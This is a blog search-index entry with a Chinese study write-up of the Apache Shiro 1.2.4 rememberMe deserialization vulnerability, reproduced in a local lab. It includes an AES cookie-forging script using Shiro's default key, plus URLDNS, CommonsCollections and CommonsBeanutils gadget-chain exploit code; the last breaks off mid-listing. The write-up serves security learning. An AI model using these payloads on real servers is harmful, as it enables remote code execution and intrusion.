<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Shiro反序列化学习</title>
      <link href="/2023/08/29/shiro-unser/"/>
      <url>/2023/08/29/shiro-unser/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro反序列化学习"><a href="#Shiro反序列化学习" class="headerlink" title="Shiro反序列化学习"></a>Shiro反序列化学习</h1><blockquote><p>参考：</p><p><a href="http://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇）</a></p><p><a href="http://changxia3.com/2020/10/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%88%E8%A7%A3%E7%96%91%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记三（解疑篇）</a></p><p><a href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a></p><p><a href="https://space.bilibili.com/2142877265/channel/collectiondetail?sid=39118">Shiro反序列化</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>可以直接<code>git</code>下来切换版本，也可以直接用这个<a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">链接</a>下载，使用的版本是<code>1.2.4</code>。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure><p>下载后修改<code>samples\web\pom.xml</code>里面的<code>jstl</code>版本为<code>1.2</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>导入为<code>maven</code>项目后配置下<code>tomcat</code>即可启动</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>当用户勾选<code>Remember Me</code>登陆时，Shiro会获取用户请求的Cookie中的<code>rememberMe</code>的值，然后对rememberMe进行Base64解码并使用AES进行解密，最后对解密的值进行反序列化。而由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，最终会对用户构造的恶意数据进行反序列化。</p><p>我们首先在全局搜索<code>rememberme</code>字段可以找到<code>CookieRememberMeManager.java</code>，在里面可以很轻易地找到带有<code>Serialized</code>字样的<code>getRememberedSerializedIdentity</code>函数</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-1.png" alt="Shiro-1.png"></p><p>看一下逻辑其实就是获取对应的<code>Cookie</code>值然后<code>Base64</code>解密。</p><p>然后看一下发现它是被<code>AbstractRememberMeManager.getRememberedPrincipals</code>调用</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-2.png" alt="Shiro-2.png"></p><p>这个函数主要就是把解密后的内容转换成认证信息，跟进图中的红框看一下</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-3.png" alt="Shiro-3.png"></p><p>可以很明显的看到里面有一个<code>deserialize</code>函数，跟进去看一下</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-4.png" alt="Shiro-4.png"><br><img src="https://cdnjson.com/images/2023/08/29/Shiro-5.png" alt="Shiro-5.png"><br><img src="https://cdnjson.com/images/2023/08/29/Shiro-6.png" alt="Shiro-6.png"></p><p>一直跟进到最后发现调用了<code>DefaultSerializer</code>中的<code>deserialize</code>，而其中使用了原生的反序列化，所以到这里其实已经可以确定存在反序列化漏洞了，如果存在相应<code>CC</code>依赖的话就可以打<code>CC链</code>。</p><p>接下来就要考虑利用了，回到前面的<code>convertBytesToPrincipals</code>函数，它第一步是进行一个解密，然后才进行了反序列化，跟进到<code>decrypt</code>函数看一下</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-7.png" alt="Shiro-7.png"></p><p>这里其实就是<code>AES</code>的加解密，然后的话如果能知道<code>key</code>的话就能够构造我们自己的数据进行反序列化，接下来就去找这个<code>key</code>，跟进到<code>getDecryptionCipherKey</code></p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-8.png" alt="Shiro-8.png"></p><p>发现是一个常量，去看哪里对它进行了赋值</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-9.png" alt="Shiro-9.png"></p><p>接着去找哪里调用了这个函数，一步步往上走</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-10.png" alt="Shiro-10.png"></p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-11.png" alt="Shiro-11.png"></p><p>这里我们发现一个常量，跟进去看一下可以发现<code>key</code>是一个常量</p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-12.png" alt="Shiro-12.png"></p><p>现在找到了<code>key</code>，要进行<code>AES</code>加密构造数据还需要一个初始向量，我们回到前面的<code>decrypt</code>函数，跟进到<code>cipherService.decrypt</code>中去，发现是一个接口，接着走可以找到<code>JcaCipherService</code></p><p><img src="https://cdnjson.com/images/2023/08/29/Shiro-13.png" alt="Shiro-13.png"></p><p>其实就是把我们传进来的数据的前面的字节复制一下当作<code>iv</code>然后再进行解密，因此我们加密时候的<code>iv</code>是可以随便取的。</p><p>到这里其实<code>key</code>和<code>iv</code>都已经知道了，只需要把对应依赖的<code>payload</code>构造出来进行加密，然后放到<code>Cookie</code>中的<code>rememberMe</code>字段里就可以利用<code>Shiro</code>的反序列化漏洞了（这里注意下后面利用的时候要删掉<code>Cookie</code>中的<code>JSESSION</code>字段）。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><blockquote><p>如果调试运行报<strong>Error opening zip file or JAR manifest missing : xxxx\gragent.jar</strong>，可以看这篇<a href="https://blog.csdn.net/qq_43338182/article/details/115663473">博客</a>解决</p></blockquote><p>放一个网上的<code>AES</code>脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">BS = AES.block_size</span><br><span class="line"><span class="comment"># 字符串</span></span><br><span class="line"><span class="comment"># pad = lambda s: (s + ((BS -len(s) % BS) * chr(BS - len(s) % BS))).encode()</span></span><br><span class="line"><span class="comment"># 文件流</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS -<span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"><span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">enc_data = base64.b64decode(enc_data)</span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line"><span class="comment"># plaintext = bytes.decode(plaintext)</span></span><br><span class="line">plaintext = unpad(plaintext)</span><br><span class="line"><span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># print(aes_enc(&quot;aaa&quot;))</span></span><br><span class="line"><span class="comment"># enc_data = b&quot;4xdG62dNT+61tUNef+iKpwrxzoNJydJHWDLpHljE4QQ=&quot;</span></span><br><span class="line"><span class="comment"># plaintext = aes_dec(enc_data)</span></span><br><span class="line"><span class="comment"># print(plaintext)</span></span><br><span class="line">data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>掏出我的祖传<code>exp</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://zehh8m1ntruwjn42ueft0zdn2e84wt.burpcollaborator.net&quot;</span>);</span><br><span class="line">        <span class="comment">// 修改初始的hashCode，使得序列化时不会触发</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">urlfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        urlfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        urlfield.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        urlfield.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成<code>ser.bin</code>后用刚才的<code>AES</code>脚本加密，把得到的<code>payload</code>放到<code>Cookie</code>中里（记得删除<code>JSESSIONID</code>），发包即可</p><p><img src="https://cdnjson.com/images/2023/08/29/URLDNS.png" alt="URLDNS.png"></p><h2 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h2><p>在<code>samples\web\pom.xml</code>里面添加一些依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里在如果直接使用CommonCollections3、5、6、7链会导致反序列化漏洞无法利用成功，具体原因可以看一下<a href="http://changxia3.com/2020/10/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%89%EF%BC%88%E8%A7%A3%E7%96%91%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记三（解疑篇）</a>这篇博客。简单来说就是<code>tomcat</code>的原因导致<code>Transformer</code>数组不能用了，所以要找一个不使用该数组的方法，最后使用<code>CC3+CC2+CC6</code>组合出了一条链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// CC3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/cn/evo1/cc/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC6</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 改成ConstantTransformer是为了防止put的时候就被使用</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;evo2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化的时候需要这个key来过掉LazyMap.get中的map.containsKey(key) == false</span></span><br><span class="line">        <span class="comment">// 但是序列化后这个key会被放进去，所以需要再去掉</span></span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以用<code>JRMP</code>这条链子，可以参考这篇<a href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a></p><h2 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h2><p>这里先本地建个项目测试下，添加个依赖保持和<code>Shiro</code>项目的版本一致</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先创建一个<code>JavaBean</code>样式的<code>Person</code>类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> age</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> age</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name = &quot;</span> + name + <span class="string">&quot;, age = &quot;</span> + age + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写一个例子</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;evo1&quot;</span>, <span class="number">21</span>);</span><br><span class="line">        <span class="comment">// 默认方法</span></span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line">        <span class="comment">// 借助CB可以简化为</span></span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person,<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试看一下流程</p><p><img src="https://cdnjson.com/images/2023/08/29/CB-1.png" alt="CB-1.png"><br><img src="https://cdnjson.com/images/2023/08/29/CB-2.png" alt="CB-2.png"><br><img src="https://cdnjson.com/images/2023/08/29/CB-3.png" alt="CB-3.png"><br><img src="https://cdnjson.com/images/2023/08/29/CB-4.png" alt="CB-4.png"><br><img src="https://cdnjson.com/images/2023/08/29/CB-5.png" alt="CB-5.png"><br><img src="https://cdnjson.com/images/2023/08/29/CB-6.png" alt="CB-6.png"></p><p>考虑这种<code>getXxxx</code>的样式，可以想到<code>TemplatesImpl</code>中的<code>getOutputProperties</code>，借助该方法写一下<code>exp</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, IOException, TransformerConfigurationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// PriorityQueue.readObject-&gt;BeanComparator.compare-&gt;PropertyUtils.getProperty-&gt;TemplatesImpl.getOutputProperties-&gt;TemplatesImpl.newTransformer</span></span><br><span class="line">        <span class="comment">// CC3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span 